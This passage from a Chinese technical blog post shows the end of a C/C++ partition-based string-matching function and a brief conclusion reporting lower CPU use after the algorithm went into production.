class=\"crayon-v\">pre_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-27\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">l</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp_value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pre_v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//前一列第0个partition长度肯定&gt;=1</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'a'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">loc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">find</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'a'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-34\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pre_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-36\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-38\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//每列第一个partition尾值</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">tmp_value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-42\"> </div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//遍历前一列剩下的partition</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pre_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-45\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pre_v</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-46\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">pre_v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-47\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-48\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-49\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-50\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-51\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-52\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-53\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'a'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">loc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">find</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'a'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-54\"><span class=\"crayon-h\">          </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-55\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pre_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-56\"><span class=\"crayon-h\">          </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-57\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-58\"><span class=\"crayon-h\">          </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-59\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-60\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-61\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-62\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-63\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//新得到的partition长度为0，那么下一个partition的起始值比上一个partition尾值少1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-64\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">tmp_value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-65\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-66\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">tmp_value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-67\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-68\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-69\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-70\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-71\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-72\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">tmp_value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-73\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tmp_value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_v</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-74\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">min_v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp_value</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-75\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-76\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-77\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">min_v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-sy\">_</span>value<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp_value</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-78\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-79\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-80\"><span class=\"crayon-h\">  </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_v</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-81\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0578 seconds] -->\r\n<p></p>\n<h2 id=\"结语\">结语</h2>\n<p>这个算法应用到线上之后，效果非常明显，如下对比。</p>\n<ul>\n<li>优化前CPU：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/de059dade8a0991336671e2ca30ec6cc.png\"></li>\n<li>优化后CPU：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/119372838e68d1a9ee93196f799522a2.png\"></li>\n</ul>\n<p>能力有限，证明不充分，有兴趣的小果伴可以直接去看原版论文，欢迎交流，共同进步。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114324\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114324votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114324\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n    